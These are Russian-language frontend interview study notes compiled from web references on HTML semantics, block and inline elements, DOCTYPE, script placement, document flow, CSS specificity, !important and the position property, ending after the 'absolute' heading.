## HTML/ CSS

  

##### **Что такое семантика в HTML?**
Одна из важных особенностей HTML — семантика, которая буквально переводится как «обозначающий». При помощи HTML мы описываем структуру страниц и их содержимого, то есть объясняем браузерам, вспомогательным и другим технологиям и программам _значение элементов_. Это может быть параграф текста, кнопка, часть страницы с основным содержимым или ничего не значащий контейнер.

На практике семантика HTML-элементов передаётся через их [роли](https://doka.guide/a11y/aria-roles/), а ещё [состояния и свойства](https://doka.guide/a11y/aria-attrs/). Роли описывают основной смысл элемента, а состояния и свойства добавляют больше деталей: выбран или не выбран чекбокс, активно или неактивно поле в форме и так далее.
Все HTML-теги, которых больше 100, семантические. Для простоты разделим их на две группы — секционные и контентные. Полный список элементов найдёте [в HTML Living Standard](https://html.spec.whatwg.org/multipage/).

Секционные теги делят HTML-документ (страницу) на большие логические блоки или секции:

- [`<article>`](https://doka.guide/html/article/) — самостоятельный блок с содержимым вроде превью поста в блоге, карточки товара или рекламного баннера. Такой контент не потеряет смысл, если его перенести на другую страницу или сайт.
- [`<nav>`](https://doka.guide/html/nav/) — основная или дополнительная навигация со ссылками на другие страницы или отдельные разделы.
- [`<section>`](https://doka.guide/html/section/) — блок, который объединяет содержимое по смыслу.
- [`<main>`](https://doka.guide/html/main/) — основное содержимое страницы.
- [`<header>`](https://doka.guide/html/header/) — вводное содержимое или навигация. Не привязан к конкретному месту страницы и отдельной секции, но традиционно используется для создания основной навигации по сайту — шапки (хедера). Также можно использовать для оборачивания оглавления раздела, заголовка статьи с вводной информацией о ней и прочего.
- [`<footer>`](https://doka.guide/html/footer/) — дополнительная информация о сайте или части одной страницы. Тоже не привязан к части страницы или отдельной секции. Например, подвал (футер) может быть у превью поста и содержать информацию о дате публикации и авторе.
Контентные теги описывают смысл частичек и типов содержимого — контента. Перечислим несколько тегов, на самом деле их гораздо больше:

- [`<h1>`-`<h6>`](https://doka.guide/html/h1-h6/) для определения заголовков на странице. `<h1>` используют для основного заголовка документа или раздела. Остальные нужны для подзаголовков. Все заголовки описывают структуру и иерархию страниц.
- [`<button>`](https://doka.guide/html/button/) для кнопок. Используют для отправки форм и выполнения других команд.
- [`<img>`](https://doka.guide/html/img/) для картинок.
- [`<table>`](https://doka.guide/html/tables/) для таблиц. Состоят из нескольких элементов для структурирования табличных данных: строк `<tr>`, заголовочных ячеек `<th>` и ячеек с данными `<td>`.
- [`<ul>`](https://doka.guide/html/ul/) неупорядоченный маркированный список.
- [`<a>`](https://doka.guide/html/a/) для ссылок, с помощью которых пользователи переходят от одной страницы к другой.
- [`<p>`](https://doka.guide/html/p/) для абзацев текста. Это основные блоки текста в HTML; логически разграничивают части текста с общей мыслью или идеей.
###### Поддержка и читаемость кода

 Скопировать ссылку "Поддержка и читаемость кода"

Исходный код проекта с вниманием к семантике легче поддерживать. В нём проще ориентироваться, а любой член команды сразу видит логику отдельных элементов и общую структуру интерфейса. Польза семантики особенно заметна, когда проект постоянно развивается и обзаводится новыми компонентами. В такой код проще и быстрее вносить изменения.
###### UX, юзабилити и доступность

 Скопировать ссылку "UX, юзабилити и доступность"

Семантика — основа хорошего пользовательского опыта или UX (user experience). Хороший UX складывается из лёгкого и успешного взаимодействия с интерфейсами (юзабилити), полезного содержимого, доступности для пользователей с инвалидностью и общей удовлетворённости от всего процесса.
###### Браузеры, расширения и другие технологии

 Скопировать ссылку "Браузеры, расширения и другие технологии"

Семантика приносит пользу и самим браузерам. К примеру, во все браузеры встроен _режим чтения (reading mode)_. В нём со страницы удаляются все лишние элементы и остаётся самое важное: заголовки, текст, картинки и видео. Если страница, например, свёрстана без `<h1>`, `<h2>` и заголовков других уровней, пользователи получат большой кусок неструктурированного текста. Такие же проблемы будут и у сервисов для RSS (really simple syndication) и отложенного чтения и закладок вроде Pocket.
###### Поисковая оптимизация

 Скопировать ссылку "Поисковая оптимизация"

Поисковики стерпят всё и поймут вас в любом случае, даже если общаетесь с ними на языке дивов. Однако семантика упрощает им работу и позитивно влияет на поисковую оптимизацию сайтов — SEO (search engine optimization), а именно:

- улучшает точность индексации страниц;
- повышает показатели производительности сайта;
- увеличивает органический трафик и количество кликов;
- гарантирует ~~спокойную старость~~ спокойное будущее.
**Более точная индексация**. Семантика дополняет другие факторы ранжирования и раскрывает больше информации о структуре сайта, темах страниц и связях между разными видами контента. Поисковые роботы точнее определяют главную тему страницы по заголовку `<h1>` и атрибуту [`title`](https://doka.guide/html/title/).
**Лучшая производительность**. Производительность — ещё один ключевой фактор ранжирования. Браузеры лучше работают с чистым и хорошо организованным кодом. Семантическая разметка как раз избавляет от лишнего JavaScript и CSS, а это ускоряет загрузку страниц.
**Рост органического трафика**. Органический трафик (organic traffic) — это количество пользователей, которые перешли на сайт из поисковой выдачи, а не по рекламным ссылкам и баннерам.

##### Блочные и строчные элементы
Исторически HTML-элементы было принято делить на блочные и строчные. Блочные элементы занимают всю ширину своего родителя (контейнера), формально создавая «блок» (отсюда и название).

Браузеры обычно отображают блочные элементы с переводом строки до и после элемента. Блочные элементы можно представить в виде стопки коробок.
Существует несколько ключевых отличий между блочными и строчными элементами:

[Содержание](https://developer.mozilla.org/ru/docs/Glossary/Block-level_content#%D1%81%D0%BE%D0%B4%D0%B5%D1%80%D0%B6%D0%B0%D0%BD%D0%B8%D0%B5)

Как правило, блочные элементы могут содержать строчные элементы и другие блочные элементы. Неотъемлемой частью этого структурного различия является идея, что блочные элементы создают «более крупную» структуру, чем встроенные элементы.

[Форматирование по умолчанию](https://developer.mozilla.org/ru/docs/Glossary/Block-level_content#%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5_%D0%BF%D0%BE_%D1%83%D0%BC%D0%BE%D0%BB%D1%87%D0%B0%D0%BD%D0%B8%D1%8E)

По умолчанию блочные элементы начинаются с новой строки, а строчные могут начинаться в любом месте строки.

Разделение элементов на блочные и строчные использовалось в спецификации HTML до версии 4.01. В HTML5 это противопоставление заменено более сложным набором [категорий контента](https://developer.mozilla.org/ru/docs/Web/HTML/Guides/Content_categories). Категория «строчных» элементов примерно соответствует категории [текстового контента](https://developer.mozilla.org/ru/docs/Web/HTML/Guides/Content_categories#phrasing_content), а для «блочных» элементов прямого соответствия нет, но «блочные» и «строчные» элементы вместе примерно соответствуют категории [потокового контента](https://developer.mozilla.org/ru/docs/Web/HTML/Guides/Content_categories#%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D0%BE%D0%B9_%D0%BF%D0%BE%D1%82%D0%BE%D0%BA) в HTML5 (т.е., грубо говоря, «блочные» элементы — это потоковый контент минус текстовый контент). Кроме того, есть и другие категории, например, интерактивный контент.
Блочным называется элемент, который занимает всю доступную ширину и всегда начинается с новой строки. У элементов с таким поведением в стилях свойство [display](https://webref.ru/css/display) задано как block, list-item, table и в некоторых случаях run-in. В HTML есть ряд элементов, у которых эти значения display установлены по умолчанию, поэтому они уже наделены свойствами блочных элементов. В частности, это `<address>, <blockquote>, <h1>…<h6>, <p>, <ol>, <ul>, <section>, <div> `и др.

###### Особенности блочных элементов

Для блочных элементов характерны следующие особенности.

**По ширине блочные элементы занимают всё допустимое пространство.**

Если элемент располагается непосредственно внутри `<body>`, то он будет занимать всю ширину веб-страницы. Если один элемент находится внутри другого, то он будет занимать всю ширину своего родителя. В примере 1 показано, как это получается.

**Ширина блока складывается из значений свойств width, padding, border и margin.**

В примере 1 намеренно не указано свойство width, которое определяет ширину содержимого блока. Как только мы добавляем width, то блок уже не будет занимать всё доступное пространство по ширине. При этом ширина самого блока определяется сложением значений margin-left, border-left, padding-left, width, padding-right, border-right, margin-right. Иными словами, ширина содержимого плюс значения свойств padding, border и margin слева и справа

**Высота блочного элемента вычисляется браузером автоматически, исходя из содержимого блока.**

Для высоты элемента работают те же принципы, что и для ширины, за исключением того, что высота блока зависит от высоты содержимого и меняется динамически, например, при изменении размера шрифта или окна браузера. Если явно установить высоту содержимого через свойство height, то высота блока складывается из height и значений margin, border, padding сверху и снизу

**Блоки располагаются по вертикали друг под другом.**

Поскольку блочные элементы занимают всё доступное пространство по ширине, то они располагаются друг под другом по вертикали.

**На блочные элементы не действуют свойства, предназначенные для строчных элементов.**

Ряд стилевых свойств, вроде vertical-align, работает только для строчных элементов и их применение к блочным элементам не даёт никакого видимого результата.

###### Строчные
Строчными называются такие элементы, которые являются непосредственной частью строки, у них значение свойства [display](https://webref.ru/css/display) установлено как inline. Элементы, для которых это значение задано по умолчанию, — `<span>, <a>, <q>, <code>` и др., в основном они используются для изменения вида текста или его смыслового выделения.

**Свойства, связанные с размерами (width, height), не применимы.**

Размеры строчных элементов определяются их содержимым и не могут напрямую меняться с помощью свойств width и height, которые, соответственно, задают ширину и высоту элемента. Добавление этих свойств к строчным элементам просто игнорируется.

**Размер элемента равен его содержимому плюс значения margin, border и padding.**

Несмотря на то, что явно задать размеры элемента нельзя, на него можно влиять косвенно с помощью свойств margin, border и padding, значения которых суммируются с размерами содержимого (пример 1).

Пример 1. Размеры элемента

```
<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8">
  <title>Размеры элемента</title>
  <style>
   h1 {
    background: #EDE6CE; /* Цвет фона */
   }
   h1 span {
    margin: 16px; /* Отступы */
    padding: 1px; /* Поля */
    border-bottom: 2px solid #D71920; /* Линия снизу */
   }
  </style>
 </head>
 <body>
  <h1><span>Заголовок</span></h1>
 </body>
</html>
```

В данном примере внутрь блочного элемента `<h1>` добавлен строчный элемент `<span>` и для него уже заданы свойства margin, padding и border. Это сделано для того, чтобы линия была строго под текстом (рис. 1), а не на всю длину блока, как получилось бы, добавь мы border для h1 напрямую.

**Перенос текста считается за пробел.**

В коде HTML любой перенос текста воспринимается браузером как пробел, это касается и размещения элементов на отдельных строках. Сравните два абзаца в примере 3. В первом абзаце каждый `<span>` располагается на отдельной строке, а во втором абзаце код идёт сплошной строкой без пробелов и переносов.

**Срочные элементы переносятся на другую строку при необходимости.**

Раз мы имеем дело со строками, то текст, естественно, переносится, чтобы строка целиком поместилась по ширине. Перенос текста, как правило, происходит в месте пробела и может разделить наш строчный элемент на две части и более. Это не страшно, пока к элементу не применяется стилевое оформление.

**Можно выравнивать по вертикали с помощью свойства vertical-align.**

Свойство [vertical-align](https://webref.ru/css/vertical-align) выравнивает элементы относительно друг друга по вертикали, что позволяет делать верхний и нижний индексы, задавать выравнивание содержимого ячеек таблицы, задавать положение блоков и др. В примере 4 показано выравнивание картинок и текста по середине друг друга.


##### Для чего нужен DOCTYPE?[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%B4%D0%BB%D1%8F-%D1%87%D0%B5%D0%B3%D0%BE-%D0%BD%D1%83%D0%B6%D0%B5%D0%BD-doctype "Прямая ссылка на Для чего нужен DOCTYPE?")

  

**DOCTYPE** — это сокращение от **DOCument TYPE** (тип документа). DOCTYPE всегда связан с **DTD** — **Document Type Definition** (определение типа документа).

DTD определяет как должны быть структурированы документы определенного типа (т.е. тег `button` может содержать в себе тег `span`, но не `div`), в то время как DOCTYPE объявляет, к какому DTD _предположительно_ относится документ.

Для веб-страниц объявление DOCTYPE необходимо. Он используется для того, чтобы сообщить пользовательскому агенту, к какой версии спецификаций HTML принадлежит ваш документ. Как только пользовательский агент распознал правильный DOCTYPE, он запустит режим **no-quirks**, соответствующий этому DOCTYPE, для чтения документа. Если пользовательский агент не распознает правильный DOCTYPE, он активирует режим **quirks**.

DOCTYPE для стандарта HTML5 определяется как `<!DOCTYPE html>`.

  
##### Почему хорошей практикой считается располагать `<link>` для подключения CSS между `<head></head>`, а `<script>` для подключения JS ставить перед `</body>`? Знаете ли вы исключения?[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BF%D0%BE%D1%87%D0%B5%D0%BC%D1%83-%D1%85%D0%BE%D1%80%D0%BE%D1%88%D0%B5%D0%B9-%D0%BF%D1%80%D0%B0%D0%BA%D1%82%D0%B8%D0%BA%D0%BE%D0%B9-%D1%81%D1%87%D0%B8%D1%82%D0%B0%D0%B5%D1%82%D1%81%D1%8F-%D1%80%D0%B0%D1%81%D0%BF%D0%BE%D0%BB%D0%B0%D0%B3%D0%B0%D1%82%D1%8C-link-%D0%B4%D0%BB%D1%8F-%D0%BF%D0%BE%D0%B4%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D1%8F-css-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-headhead-%D0%B0-script-%D0%B4%D0%BB%D1%8F-%D0%BF%D0%BE%D0%B4%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D1%8F-js-%D1%81%D1%82%D0%B0%D0%B2%D0%B8%D1%82%D1%8C-%D0%BF%D0%B5%D1%80%D0%B5%D0%B4-body-%D0%B7%D0%BD%D0%B0%D0%B5%D1%82%D0%B5-%D0%BB%D0%B8-%D0%B2%D1%8B-%D0%B8%D1%81%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D1%8F "Прямая ссылка на почему-хорошей-практикой-считается-располагать-link-для-подключения-css-между-headhead-а-script-для-подключения-js-ставить-перед-body-знаете-ли-вы-исключения")

**Размещение `<link>` внутри `<head>`**

Размещение `<link>` внутри тега `<head>` необходимо при создании оптимизированного веб-сайта. Когда страница загружается впервые, HTML и CSS анализируются одновременно; HTML создает DOM (объектную модель документа), а CSS создает CSSOM (объектную модель CSS). И то, и другое необходимо для создания визуальных элементов на веб-сайте, что позволяет быстро определить время «первого значимого рисования». Этот прогрессивный рендеринг является категорией оптимизации сайтов, которые измеряются в их показателях эффективности. Размещение таблиц стилей в нижней части документа - это то, что препятствует прогрессивной загрузке страницы во многих браузерах. Некоторые браузеры блокируют рендеринг, чтобы избежать перерисовки элементов страницы, если ее стили изменятся. Все это время пользователь будет пялиться на пустую белую страницу. В других случаях может возникать мерцание нестилизованного содержимого (FOUC), на котором может отображаться веб-страница без применения стилей.

**Размещение `<script>` прямо перед `</body>`**

Теги `<script>` блокируют отрисовку HTML на то время, пока они скачиваются и исполняются. Размещение скриптов внизу позволяет сперва распарсить и показать пользователю весь HTML.

Исключением является случай, когда в вашем скрипте содержится `document.write()`. Но на сегодняшний день его использование не считается хорошей практикой. К тому же, расположение скриптов внизу разметки означает, что браузер не может начать их скачивать до тех пор, пока не отрисован весь документ. Единственным рабочим способом, при котором `<script>` будет расположен внутри `<head>`, является добавление атрибута defer.
##### Что такое прогрессивный рендеринг[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D1%87%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B5%D1%81%D1%81%D0%B8%D0%B2%D0%BD%D1%8B%D0%B9-%D1%80%D0%B5%D0%BD%D0%B4%D0%B5%D1%80%D0%B8%D0%BD%D0%B3 "Прямая ссылка на Что такое прогрессивный рендеринг")

Прогрессивный рендеринг — это название технологий, используемых для ускорения отрисовки страниц (в частности, для уменьшения времени загрузки), чтобы показать пользователю контент как можно скорее.

До того, как широкополосный интернет распространился повсеместно, прогрессивный рендеринг встречался довольно часто. Но этот подход по прежнему полезен в современной разработке, поскольку все более популярным (и ненадежным) становится мобильный доступ в интернет.

Примеры подобных технологий:

- Ленивая загрузка изображений. Изображения на странице не загружаются все разом. JavaScript подгрузит изображения тогда, когда пользователь доскроллит до той части страницы, на которой они расположены.
- Приоритизация видимого контента. Только минимум CSS, контента, скриптов, необходимых для отрисовки той части страницы, которую пользователь увидит первой. Вы можете использовать отложенные скрипты или слушать события `DOMContentLoaded` или `load`, чтобы загрузить остальные ресурсы и контент.
- Асинхронные фрагменты HTML. Отправка в браузер частей HTML-страницы, созданной на бэкенде. Более подробно про эту технологию можно почитать [в этой статье](http://www.ebaytechblog.com/2014/12/08/async-fragments-rediscovering-progressive-html-rendering-with-marko/).

##### Поток документа

Это принцип организации элементов на странице при отсутствии стилей: если мы напишем HTML и не напишем CSS, то отображение в браузере будет предсказуемо благодаря тому, что мы абсолютно точно знаем, как браузер располагает элементы в потоке.

Даже если к странице не подключено никаких стилей, к каждому элементу всё равно будут применяться CSS-правила, «зашитые» в движке браузера.

Правила расположения строчных и блочных элементов в нормальном потоке называются **контекстом форматирования**. Блочные элементы участвуют в формировании **блочного** контекста форматирования. Строчные элементы формируют **строчный** контекст форматирования. Расположение элементов в контексте форматирования зависит от направления письма для конкретного языка. Например, тексты на европейских языках мы читаем и пишем слева направо сверху вниз. Это означает, что по умолчанию контекст форматирования располагает блочные элементы сверху вниз, а строчные — слева направо.
###### Блочные элементы в нормальном потоке

 Скопировать ссылку "Блочные элементы в нормальном потоке"

Блочные элементы в нормальном потоке располагаются друг под другом, всегда занимая всю доступную ширину родителя. Высота блочного элемента по умолчанию равна высоте его содержимого. Три абзаца, идущие друг за другом в HTML, будут располагаться точно в таком же порядке и на странице.

Даже если ширина блочного элемента явно задана и позволяет разместить справа ещё один такой элемент, поток всё равно продолжит выстраивать их друг под другом.

###### Строчные элементы в нормальном потоке

 Скопировать ссылку "Строчные элементы в нормальном потоке"

Строчные элементы располагаются друг за другом, как слова в предложении. В зависимости от направления письма в конкретном языке элементы могут располагаться слева направо (например, в русском языке), справа налево (как, например, в иврите) и даже сверху вниз (как иероглифы и знаки слоговых азбук в японском вертикальном письме). Ширина и высота строчного элемента равна ширине и высоте содержимого. В отличие от блочного элемента, мы не можем управлять шириной и высотой строчного элемента через CSS. Несколько строчных элементов будут стремиться уместиться на одной строке, насколько хватает ширины родителя. Если ширины родителя не хватает, то лишний текст строчного элемента переносится на следующую строку.

###### Схлопывание и выпадение отступов

 Скопировать ссылку "Схлопывание и выпадение отступов"

В рамках блочного контекста форматирования вертикальные расстояния между блоками задаются CSS-свойством [`margin`](https://doka.guide/css/margin/). Если блоку задан нижний отступ, а следующему за ним — верхний, то можно ожидать, что итоговый отступ между блоками будет равен сумме этих двух отступов. Но в соответствии со спецификацией соприкасающиеся отступы «схлопываются». То есть как бы проваливаются один в другой. Итоговый отступ будет равен бо́льшему отступу из двух.

Выпадение отступов из родителя можно предотвратить несколькими способами, например:

- Задать родителю вертикальный внутренний отступ [`padding-top`](https://doka.guide/css/padding/) или [`padding-bottom`](https://doka.guide/css/padding/) в зависимости от того, с какой стороны мы хотим предотвратить выпадение.
- Задать родителю верхнюю или нижнюю [рамку](https://doka.guide/css/border/) по такой же логике. Рамка может быть прозрачной, главное, чтобы она была :)
- Задать родителю свойство [`overflow`](https://doka.guide/css/overflow/) со значением, отличным от `visible`.
- Переопределить родителю свойство [`display`](https://doka.guide/css/display/) на `flow-root`, либо на `flex` или `grid` (но в последнем случае его потомки будут раскладываться уже не по правилам нормального потока, а по правилам [флексбоксов](https://doka.guide/css/flexbox-guide/) и [грид-раскладки](https://doka.guide/css/grid-guide/) соответственно).


https://doka.guide/html/flow/

##### **Что такое селекторы в CSS?**

**Селектор** определяет, к какому элементу применять то или иное CSS-правило.

  

##### **Что такое специфичность в CSS?**

**Специфичность** - это способ, с помощью которого браузеры определяют, какие значения свойств CSS наиболее соответствуют элементу и, следовательно, будут применены. Специфичность основана на правилах соответствия, состоящих из [селекторов CSS](https://developer.mozilla.org/ru/docs/Web/CSS/Reference#selectors) различных типов.

Специфичность представляет собой вес, придаваемый конкретному правилу CSS. Вес правила определяется количеством каждого из [типов селекторов](https://developer.mozilla.org/ru/docs/Web/CSS/CSS_cascade/Specificity#selector_types) в данном правиле. Если у нескольких правил специфичность одинакова, то к элементу применяется последнее по порядку правило CSS. Специфичность имеет значение только в том случае, если один элемент соответствует нескольким правилам. Согласно спецификации CSS, правило для непосредственно соответствующего элемента всегда будет иметь больший приоритет, чем правила, унаследованные от предка.

В следующем списке типы селекторов расположены по возрастанию специфичности:

1. селекторы типов элементов (например, `h1`) и псевдоэлементов (например, `::before`).
2. селекторы классов (например, `.example`), селекторы атрибутов (например, `[type="radio"]`) и псевдоклассов (например, `:hover`).
3. селекторы идентификаторов (например, `#example`).

Универсальный селектор (`*`), комбинаторы (`+`, `>`, `~`, '``') и отрицающий псевдокласс (`:not()`) не влияют на специфичность. (Однако селекторы, объявленные _внутри_ `:not()`, влияют)

Стили, объявленные в элементе (например, `style="font-weight:bold"`), всегда переопределяют любые правила из внешних файлов стилей и, таким образом, их специфичность можно считать наивысшей.

###### [Важное исключение из правил - `!important`](https://developer.mozilla.org/ru/docs/Web/CSS/CSS_cascade/Specificity#%D0%B2%D0%B0%D0%B6%D0%BD%D0%BE%D0%B5_%D0%B8%D1%81%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5_%D0%B8%D0%B7_%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D0%BB_-_!important)

Когда при объявлении стиля используется модификатор `!important`, это объявление получает наивысший приоритет среди всех прочих объявлений. Хотя технически модификатор `!important` не имеет со специфичностью ничего общего, он непосредственно на неё влияет. Поскольку `!important` усложняет отладку, нарушая естественное [каскадирование](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascade/Cascade) ваших стилей, он **не приветствуется** и следует избегать его использования. Если к элементу применимы два взаимоисключающих стиля с модификатором `!important`, то применён будет стиль с большей специфичностью.

**Несколько практических советов:**

- **Всегда пытайтесь использовать** специфичность, а `!important` используйте только в крайних случаях
- **Используйте** `!important` **только** в страничных стилях, которые переопределяют стили сайта или внешние стили (стили библиотек, таких как Bootstrap или normalize.css)
- **Никогда не используйте** `!important`, если вы пишете плагин или мэшап.
- **Никогда не используйте** `!important` в общем CSS сайта.

**Вместо `!important` можно:**

1. Лучше использовать каскадные свойства CSS
    
2. Использовать более специфичные правила. Чтобы сделать правило более специфичным и повысить его приоритет, укажите один элемент или несколько перед нужным вам элементом:
    
    htmlCopy to Clipboard
    
    ```css
    <div id="test">
      <span>Text</span>
    </div>
    ```
    
    cssCopy to Clipboard
    
    ```css
    div#test span {
      color: green;
    }
    div span {
      color: blue;
    }
    span {
      color: red;
    }
    ```
    

Вне зависимости от порядка следования правил, текст всегда будет зелёным, поскольку у этого правила наибольшая специфичность (при этом, правило для голубого цвета имеет преимущество перед правилом для красного, несмотря на порядок следования).

**Вам придётся использовать `!important` если:**

А) Первый сценарий:

1. У вас есть общий файл стилей, устанавливающий правила для внешнего вида сайта.
2. Вы пользуетесь (или кто-то другой пользуется) весьма сомнительным средством - объявлением стилей непосредственно в элементах

В таком случае вам придётся объявить некоторые стили в вашем общем файле CSS как `!important`, переопределяя, таким образом, стили, установленные в самих элементах.

Пример из практики: Некоторые плохо написанные **плагины jQuery**, использующие присваивание стилей самим элементам.

Б) Ещё сценарий:

cssCopy to Clipboard

```css
#someElement p {
  color: blue;
}

p.awesome {
  color: red;
}
```

Как сделать цвет текста в абзацах `awesome` красным всегда, даже если они расположены внутри `#someElement`? Без `!important` у первого правила специфичность больше и оно имеет преимущество перед вторым.

**Как преодолеть !important:**

A) Просто добавьте ещё одно правило с модификатором `!important`, у которого селектор имеет большую специфичность (благодаря добавлению типа элемента (тэга), идентификатора (атрибута id) или класса к селектору).

Пример большей специфичности:

cssCopy to Clipboard

```css
table td {
  height: 50px !important;
}
.myTable td {
  height: 50px !important;
}
#myTable td {
  height: 50px !important;
}
```

Б) Или добавьте правило с модификатором `!important` и таким же селектором, но расположенное в файле после существующего (при прочих равных выигрывает последнее объявленное правило):

cssCopy to Clipboard

```css
td {
  height: 50px !important;
}
```

В) Или перепишите первоначальное правило без использования `!important`.

Специфичность — это алгоритм, благодаря которому браузер определяет, какие именно стили из всего набора применить к элементу. В вычислениях участвуют CSS-селекторы. Если одному и тому же элементу подходит сразу несколько CSS-правил с разными селекторами, то браузер применяет те стили, вес селектора которых больше. Правило [каскада](https://doka.guide/css/cascade/) «кто ниже, тот и выигрывает» при этом может нарушаться.

Специфичность — это одно из базовых понятий в CSS.

###### Вес селекторов

 Скопировать ссылку "Вес селекторов"

Давайте разберёмся, как браузер _взвешивает_ селектор. Ниже перечислены типы селекторов по убыванию специфичности:

1. [Селекторы по идентификатору](https://doka.guide/css/id-selector/);
2. [Селекторы по классу](https://doka.guide/css/class-selector/), [селекторы по атрибуту](https://doka.guide/css/attribute-selector/) и селекторы с [псевдоклассами](https://doka.guide/css/pseudoclasses/);
3. [Селекторы по тегу](https://doka.guide/css/tag-selector/), селекторы с [псевдоэлементами](https://doka.guide/css/pseudoelements/).

Комбинаторы `+`, `>`, `~`, [универсальный селектор `*`](https://doka.guide/css/universal-selector/) и псевдокласс [`:where()`](https://doka.guide/css/where/) веса не имеют.

Псевдоклассы [`:is()`](https://doka.guide/css/is/), [`:has()`](https://doka.guide/css/has/) и [`:not()`](https://doka.guide/css/not/) принимают вес наиболее специфичного селектора внутри скобок.

###### Система расчёта

 Скопировать ссылку "Система расчёта"

Существует удобный способ вычисления веса селектора в уме. Выше мы перечислили три группы сущностей, из которых может состоять селектор. Представим любой селектор в виде трёх нулей: 0.0.0.

- Селекторы по идентификатору увеличивают первую цифру.
- Селекторы по классу, по атрибуту или псевдокласс увеличивают вторую цифру.
- Селектор по тегу или псевдоэлемент увеличивают третью цифру.

Один селектор равен единице.

Пока сложно понять. Давайте разберёмся на примерах.

- Селектор `#some` состоит из одного идентификатора. Один селектор = 1. Увеличиваем первую цифру на 1. В итоге вес такого селектора равен 1.0.0.
- `.class` состоит из одного класса. Увеличиваем вторую цифру на 1. Получаем вес селектора 0.1.0.
- `section` состоит из одного тега. Увеличиваем последнюю цифру на 1. Вес селектора равен 0.0.1.

Дальше аналогично можем посчитать вес комбинированных селекторов.

`div#some` состоит из одного селектора по тегу и одного идентификатора. Селектор по тегу увеличивает последнюю цифру, селектор по идентификатору — первую. Вес селектора равен 1.0.1.

`section h1` состоит из двух селекторов по тегу. Увеличиваем последнюю цифру на два и получаем вес 0.0.2.

`#block section > .list a` состоит из идентификатора (первая цифра), двух тегов (последняя цифра) и класса (вторая цифра). Вес селектора равен 1.1.2.

`* .list a` состоит из одного класса и одного тега. Итоговый вес будет 0.1.1. Универсальный селектор ничего не весит 🪶

Для наглядности расположим селекторы по убыванию веса. Сверху самый тяжёлый.

|Селектор|Вес|
|---|---|
|`#block section > .list a`|1.1.2|
|`div#some`|1.0.1|
|`#some`|1.0.0|
|`* .list a`|0.1.1|
|`.class`|0.1.0|
|`section h1`|0.0.2|
|`section`|0.0.1|

Если не очень хочется считать в уме, можно воспользоваться калькулятором специфичности [CSS Specificity calculator](https://polypane.app/css-specificity-calculator/).

###### Атрибут `style`

 Скопировать ссылку "Атрибут style"

CSS-свойства, написанные в атрибуте [`style`](https://doka.guide/html/global-attrs/) внутри HTML-разметки, перебивают свойства, написанные для этого элемента во внешних CSS-файлах или внутри тега [`<style>`](https://doka.guide/html/style/). Так что формально атрибут `style` самый специфичный, у него самый большой вес.

Иногда его добавляют в формулу в виде четвёртой цифры, стоящей перед всеми. Посмотрим на примере:

`<div class="element" id="this" style="color: purple; border: none">   Some smart text </div>`
Скопировать

`div.element#this {   color: green;   border: 10px solid red; }`
Скопировать

У селектора в CSS будет специфичность 1.1.1, потому что там указан один идентификатор, один класс и один селектор тега. Но в итоге текст в блоке будет пурпурным, а рамки не будет совсем. Потому что у атрибута `style` вес равен 1.0.0.0 🏋️

###### `!important`

 Скопировать ссылку "!important"

Ключевое слово [`!important`](https://doka.guide/css/important/) нарушает все установленные спецификацией законы и насильно применяет свойство, после которого написано. Ему плевать на селектор CSS-правила, внутри которого это свойство написано. Будет так, и никак иначе.

Формально это ключевое слово не имеет отношения к концепции специфичности. Но из-за его варварских замашек нельзя не принимать его во внимание.

Тут к месту будет ещё раз напомнить, что ключевое слово `!important` всегда стоит использовать с осторожностью и не злоупотреблять им. В том числе из-за того, что оно нарушает естественную работу специфичности и [каскада](https://doka.guide/css/cascade/).

##### **Как работает свойство `position` в CSS?**

https://doka.guide/css/position/

Свойство `position` задаёт способ позиционирования элемента в документе. Совместно со свойствами `left`, `right`, `top`, `bottom` или [`inset`](https://doka.guide/css/inset/) элементу задаётся его местоположение на странице.

###### Пример

 Скопировать ссылку "Пример"

`.box {   position: absolute;   left: 0;   top: 20px; }`
Скопировать

###### Как понять

 Скопировать ссылку "Как понять"

Иногда в процессе вёрстки требуется реализовать разные сложные идеи дизайнера про расположение элементов друг относительно друга. Например, расположить один элемент поверх другого или немного сместить отображение элемента относительно своего начального положения. Бывают и более сложные случаи, когда требуется зафиксировать элемент относительно окна браузера, а не относительно страницы. Базовым свойством, которое изменяет способ позиционирования, является свойство `position`.

###### Как пишется

 Скопировать ссылку "Как пишется"

###### `static`

 Скопировать ссылку "static"

Значение по умолчанию. Статичное позиционирование. Любой элемент, добавленный на страницу, будет иметь это значение и будет расположен в [нормальном потоке](https://doka.guide/html/flow/) документа согласно контексту форматирования родительского элемента. Свойства `left`, `right`, `top`, `bottom` и [`z-index`](https://doka.guide/css/z-index/) игнорируются.

Элемент со значением `position: static` **не является** позиционированным элементом. Это важный момент, потому что элементы с любым другим значением свойства `position` создают внутри себя [контекст наложения](https://doka.guide/css/stacking-context/) и становятся **опорными**. _Опорным элементом_ будем называть такой, относительно которого позиционируются дочерние элементы.

###### `relative`

 Скопировать ссылку "relative"

Элемент позиционируется так же, как и статичный, но его отображение может быть смещено относительно своего начального положения при помощи свойств `left`, `right`, `top`, `bottom` или `inset`. Это смещение **чисто визуальное** и не затрагивает положение соседних элементов, кроме случая, когда элемент выходит за границы родителя, имеющего возможность прокрутки.

На странице элемент будет занимать столько же места, как если бы он имел статичное позиционирование.

[Открыть демо в новой вкладке](https://doka.guide/css/position/demos/relative/)

###### `absolute`

 Скопировать ссылку "absolute"

